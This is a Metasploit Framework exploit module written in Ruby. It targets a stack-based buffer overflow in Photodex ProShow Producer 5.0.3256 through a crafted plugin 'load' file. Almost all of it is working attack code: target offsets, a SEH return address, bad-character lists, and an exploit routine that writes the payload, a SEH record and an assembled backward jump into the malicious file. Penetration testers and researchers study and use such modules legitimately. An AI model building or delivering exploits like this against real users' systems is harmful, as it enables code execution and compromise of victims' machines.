##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::FILEFORMAT
	include Msf::Exploit::Remote::Seh
	include Msf::Auxiliary::Report

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Photodex ProShow Producer 5.0.3256 load File Handling Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack-based buffer overflow in Photodex ProShow Producer
				v5.0.3256 in the handling of the plugins load list file. An attacker must send the
				crafted "load" file to victim, who must store it in the installation directory. The
				vulnerability will be triggered the next time ProShow is opened. The module has been
				tested successfully on Windows XP SP3 and Windows 7 SP1.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [
				'Julien Ahrens', # Vulnerability discovery and PoC
				'mr.pr0n', # Additional PoC
				'juan', # Metasploit module
			],
			'References'     =>
				[
					[ 'OSVDB', '83745' ],
					[ 'EDB', '19563' ],
					[ 'EDB', '20036' ],
					[ 'URL', 'http://security.inshell.net/advisory/30' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 9844,
					'BadChars' => "\x00\x0a\x0d",
					'StackAdjustment' => -3500,
				},
			'Platform' => 'win',
			'Targets'        =>
				[
					[
						'Photodex ProShow Producer 5.0.3256 / Windows XP SP3 / Windows 7 SP1',
						{
							'Offset' => 9844,
							'Ret' => 0x1022A959 # p/p/r from if.dnt
						}
					],
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Jun 06 2012',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('FILENAME', [ true, 'The file name.',  'load']),
			], self.class)
	end

	# Overriding file_create to allow the creation of a file without extension
	def file_create(data)

		fname = datastore['FILENAME']
		ltype = "exploit.fileformat.#{self.shortname}"

		if ! ::File.directory?(Msf::Config.local_directory)
			FileUtils.mkdir_p(Msf::Config.local_directory)
		end

		path = File.join(Msf::Config.local_directory, fname)
		full_path = ::File.expand_path(path)
		File.open(full_path, "wb") { |fd| fd.write(data) }

		report_note(:data => full_path.dup, :type => "#{ltype}.localpath")

		print_good "#{fname} stored at #{full_path}"

	end

	def exploit

		sploit = payload.encoded
		sploit << generate_seh_record(target.ret)
		# jmp back to the payload
		sploit << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-#{target['Offset']+8}").encode_string
		# cause exception hitting the end of the stack
		sploit << rand_text(300)

		print_status("Creating '#{datastore['FILENAME']}' file ...")
		file_create(sploit)

	end

end
